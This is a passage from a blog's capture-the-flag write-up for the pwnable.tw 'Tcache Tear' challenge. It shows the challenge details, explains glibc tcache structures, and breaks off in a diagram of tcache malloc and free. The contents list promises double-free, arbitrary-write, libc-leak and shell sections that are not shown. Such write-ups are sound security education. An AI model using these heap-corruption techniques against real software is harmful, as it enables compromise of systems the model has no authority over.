<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="pwnable.tw - Tcache Tear" property="og:title"><meta content="article" property="og:type"><meta content="2020-02-23T07:19:49.665Z" property="og:published_time"><meta content="2020-03-02T18:52:31.838Z" property="og:modified_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="ctf-writeups" property="og:section"><meta content="pwnable.tw" property="og:tag"><meta content="binary-exploitation" property="og:tag"><meta content="heap-exploitation" property="og:tag"><meta content="pwntools" property="og:tag"><meta content="double-free" property="og:tag"><meta content="/posts/pwnable-tw-tcache-tear/" property="og:url"><title>pwnable.tw - Tcache Tear - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"><script src="https://www.googletagmanager.com/gtag/js?id=G-X8ZVFPQ0CK" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-X8ZVFPQ0CK');</script></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div><div class="nav-right"><a href="https://github.com/srikavin"><img alt="Github" src="/gh-logo.png" height="24px" width="24px"></a></div></nav><section class="section"><div class="container"><div class="page-container"><div class="blog-header"><h1 class="title">pwnable.tw - Tcache Tear</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-02-23T07:19:49.665Z&#10;Updated: 2020-03-02T18:52:31.838Z">February 23, 2020* </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="interactive minimal tag">pwnable.tw</span></a> <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="interactive minimal tag">binary-exploitation</span></a> <a href="&#x2F;tags&#x2F;heap-exploitation&#x2F;"><span class="interactive minimal tag">heap-exploitation</span></a> <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="interactive minimal tag">pwntools</span></a> <a href="&#x2F;tags&#x2F;double-free&#x2F;"><span class="interactive minimal tag">double-free</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#background" data-target="background">Background</a><ul><li><a href="#tcache-perthread-struct" data-target="tcache-perthread-struct">tcache_perthread_struct</a></li><li><a href="#tcache-entry" data-target="tcache-entry">tcache_entry</a></li></ul></li><li><a href="#behind-the-scenes-tcache" data-target="behind-the-scenes-tcache">Behind the Scenes: tcache</a></li><li><a href="#reversing" data-target="reversing">Reversing</a></li><li><a href="#attacks" data-target="attacks">Attacks</a><ul><li><a href="#circular-list" data-target="circular-list">Circular List</a></li><li><a href="#achieving-arbitrary-write" data-target="achieving-arbitrary-write">Achieving Arbitrary Write</a></li><li><a href="#leaking-libc" data-target="leaking-libc">Leaking libc</a></li><li><a href="#crafting-chunks" data-target="crafting-chunks">Crafting Chunks</a></li><li><a href="#getting-a-shell" data-target="getting-a-shell">Getting a Shell</a></li></ul></li><li><a href="#solution" data-target="solution">Solution</a></li><li><a href="#further-reading" data-target="further-reading">Further Reading</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>Make tcache great again !</p><p><code>nc chall.pwnable.tw 10207</code></p><p><a href="https://pwnable.tw/static/chall/tcache_tear">tcache_tear</a></p><p><a href="https://pwnable.tw/static/libc/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so">libc.so</a></p></blockquote><h1 id="background">Background</h1><p>Per-thread cache (tcache) is an optimization enabled in versions of <code>libc</code> after 2.26. To increase heap performance, security checks are limited within the tcache implementation. Tcache is implemented using two important internal structures:</p><span id="continue-reading"></span><h2 id="tcache-perthread-struct"><a href="https://github.com/bminor/glibc/blob/release/2.27/master/malloc/malloc.c#L2916">tcache_perthread_struct</a></h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">typedef struct</span><span style="color:#323232;"> tcache_perthread_struct
{
  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> counts[TCACHE_MAX_BINS];
  tcache_entry </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
</span></code></pre><p>There is maximum number of entries and bins within the tcache that are defined at compile time.</p><h2 id="tcache-entry"><a href="https://github.com/bminor/glibc/blob/release/2.27/master/malloc/malloc.c#L2904">tcache_entry</a></h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">typedef struct</span><span style="color:#323232;"> tcache_entry
{
  </span><span style="font-weight:bold;color:#a71d5d;">struct</span><span style="color:#323232;"> tcache_entry </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">next;
} tcache_entry;
</span></code></pre><p>This structure is placed within the user area of a chunk when it is freed, i.e. it is placed at the address returned by <code>malloc</code>. This has some security implications.</p><h1 id="behind-the-scenes-tcache">Behind the Scenes: tcache</h1><p>The below diagram depicts normal operation of tcache with the given initial conditions.</p> <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg height="1251px" version="1.1" viewBox="-0.5 -0.5 711 1251" width="711px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs/><g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="360"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 385px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><b>NULL</b></div></div></div></foreignObject><text font-size="12px" x="305" y="389" fill="#000000" font-family="Helvetica" text-anchor="middle">NULL</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="80"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 80px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="92" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 385 280 L 400 280 L 400 340 L 305 340 L 305 353.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 358.88 L 301.5 351.88 L 305 353.63 L 308.5 351.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="240"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 240px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="252" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="60"/><path d="M 260 60 L 240 60 L 240 200 L 260 200" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 155 L 305 233.63" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 305 238.88 L 301.5 231.88 L 305 233.63 L 308.5 231.88 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="105"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 130px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="134" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="105"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 130px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="134" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="130" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="130" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="130" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="60" transform="rotate(-180,540,130)"/><path d="M 550 60 L 530 60 L 530 200 L 550 200" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,130)"/><path d="M 160 145 L 233.63 145" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 145 L 231.88 148.5 L 233.63 145 L 231.88 141.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="770"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 795px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><b>NULL</b></div></div></div></foreignObject><text font-size="12px" x="305" y="799" fill="#000000" font-family="Helvetica" text-anchor="middle">NULL</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="490"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 490px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="502" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="225" y="650"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 650px; margin-left: 225px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="225" y="662" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="470"/><path d="M 260 470 L 240 470 L 240 610 L 260 610" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 565 L 305 610 L 420 610 L 420 750 L 305 750 L 305 763.63" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 305 768.88 L 301.5 761.88 L 305 763.63 L 308.5 761.88 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="515"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 540px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="544" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="515"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 540px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="544" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="540" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="540" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="540" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="470" transform="rotate(-180,540,540)"/><path d="M 550 470 L 530 470 L 530 610 L 550 610" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,540)"/><path d="M 160 555 L 233.63 555" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 555 L 231.88 558.5 L 233.63 555 L 231.88 551.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 140 690 L 218.63 690" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 223.88 690 L 216.88 693.5 L 218.63 690 L 216.88 686.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="660"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 690px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">void* malloc()</div></div></div></foreignObject><text font-size="12px" x="80" y="694" fill="#000000" font-family="Helvetica" text-anchor="middle">void* malloc()</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="1185"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 1210px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><b>NULL</b></div></div></div></foreignObject><text font-size="12px" x="305" y="1214" fill="#000000" font-family="Helvetica" text-anchor="middle">NULL</text></switch></g><rect fill="#ffffff" height="100" pointer-events="all" stroke="#000000" width="160" x="0" y="900"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 900px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 100%"><b>tcache_perthread_struct</b></p><hr size="1"/>   char counts[]<br/><hr/>   tcache_entry *entries[]<hr/><b><div style="text-align: center"><b>0x7ffff7dcfc40</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="912" fill="#000000" font-family="Helvetica">tcache_perthread_struct   c...</text></switch></g><path d="M 80 1170 L 80 1136.37" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 80 1131.12 L 83.5 1138.12 L 80 1136.37 L 76.5 1138.12 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><path d="M 160 1210 L 243.63 1210" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 248.88 1210 L 241.88 1213.5 L 243.63 1210 L 241.88 1206.5 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="80" pointer-events="all" stroke="#000000" width="160" x="0" y="1170"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1170px; margin-left: 0px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap;"><p style="margin: 4px 0px 0px ; text-align: center ; line-height: 120%"><b>tcache_entry</b></p><hr/>   tcache_entry *next<hr/><b><div style="text-align: center"><b>0x603260</b></div></b></div></div></div></foreignObject><text font-size="12px" x="0" y="1182" fill="#000000" font-family="Helvetica">tcache_entry   tcache_entry...</text></switch></g><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="240" y="880"/><path d="M 260 880 L 240 880 L 240 1020 L 260 1020" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2"/><path d="M 305 975 L 305 1150 L 120 1150 L 120 1163.63" fill="none" pointer-events="stroke" stroke="#b85450" stroke-miterlimit="10"/><path d="M 120 1168.88 L 116.5 1161.88 L 120 1163.63 L 123.5 1161.88 Z" fill="#b85450" pointer-events="all" stroke="#b85450" stroke-miterlimit="10"/><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="250" y="925"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 950px; margin-left: 305px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;">Bin<br/>1</div></div></div></foreignObject><text font-size="12px" x="305" y="954" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><rect fill="#ffffff" height="50" pointer-events="all" stroke="#000000" width="110" x="430" y="925"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 950px; margin-left: 485px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap;"><font style="font-size: 12px">Bin <br/><span style="background-color: rgb(255 , 255 , 255) ; font-family: &quot;consolas&quot; , &quot;courier new&quot; , monospace ; white-space: pre">TCACHE_MAX_BINS</span></font></div></div></div></foreignObject><text font-size="12px" x="485" y="954" fill="#000000" font-family="Helvetica" text-anchor="middle">Bin...</text></switch></g><ellipse cx="375" cy="950" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="395" cy="950" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><ellipse cx="415" cy="950" fill="#ffffff" pointer-events="all" rx="5" ry="5" stroke="#000000"/><rect fill="none" height="140" pointer-events="all" stroke="none" width="20" x="530" y="880" transform="rotate(-180,540,950)"/><path d="M 550 880 L 530 880 L 530 1020 L 550 1020" fill="none" pointer-events="all" stroke="#000000" stroke-miterlimit="10" stroke-width="2" transform="rotate(-180,540,950)"/><path d="M 160 965 L 233.63 965" fill="none" pointer-events="stroke" stroke="#000000" stroke-miterlimit="10"/><path d="M 238.88 965 L 231.88 968.5 L 233.63 965 L 231.88 961.5 Z" fill="#000000" pointer-events="all" stroke="#000000" stroke-miterlimit="10"/><rect fill="#ffffff" height="60" pointer-events="all" stroke="#000000" width="120" x="20" y="1070"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1100px; margin-left: 21px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;">free(void* mem)</div></div></div></foreignObject><text font-size="12px" x="80" y="1104" fill="#000000" font-family="Helvetica" text-anchor="middle">free(void* mem)</text></switch></g><rect fill="none" height="70" pointer-events="all" stroke="none" width="270" x="440" y="1060"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 268px; height: 1px; padding-top: 1095px; margin-left: 441px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><div style="text-align: left ; font-size: 14px"><span>The bin's head is set to the newly freed item, and the item's </span><font face="Lucida Console">*next</font><span> pointer is set to the previous head.</span></div></div></div></div></foreignObject><text font-size="12px" x="575" y="1099" fill="#000000" font-family="Helvetica" text-anchor="middle">The bin's head is set to the newly freed item...</text></switch></g><rect fill="none" height="70" pointer-events="all" stroke="none" width="270" x="440" y="660"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 268px; height: 1px; padding-top: 695px; margin-left: 441px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: center;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><div style="text-align: left ; font-size: 14px">The bin's head pointer is set to the current head's <font face="Lucida Console">*</font><font face="Lucida Console">next</font> pointer<i>. </i>The previous head is returned.</div></div></div></div></foreignObject><text font-size="12px" x="575" y="699" fill="#000000" font-family="Helvetica" text-anchor="middle">The bin's head pointer is set to the current...</text></switch></g><rect fill="none" height="20" pointer-events="all" stroke="none" width="200" x="0" y="20"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 198px; height: 1px; padding-top: 30px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><h1>Initial Conditions</h1></div></div></div></foreignObject><text font-size="12px" x="2" y="34" fill="#000000" font-family="Helvetica">Initial Conditions</text></switch></g><rect fill="none" height="20" pointer-events="all" stroke="none" width="170" x="0" y="430"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 168px; height: 1px; padding-top: 440px; margin-left: 2px;" xmlns="http://www.w3.org/1999/xhtml"><div style="box-sizing: border-box; font-size: 0; text-align: left;"><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal;"><h1>tcache malloc</h1></div></div></div></foreignObject><text font-size="12px" x="2" y="444" fill="#000000" font-family="Helvetica">tcache malloc</text></switch></g><rect fill="none" height="20" pointer-events="all" stroke="none" width="170" x="0" y="840"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject height="100%" pointer-events="none" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility" style="overflow: visible; text-align: left;" width="100%"><div style="display: flex; align-items: unsafe center; 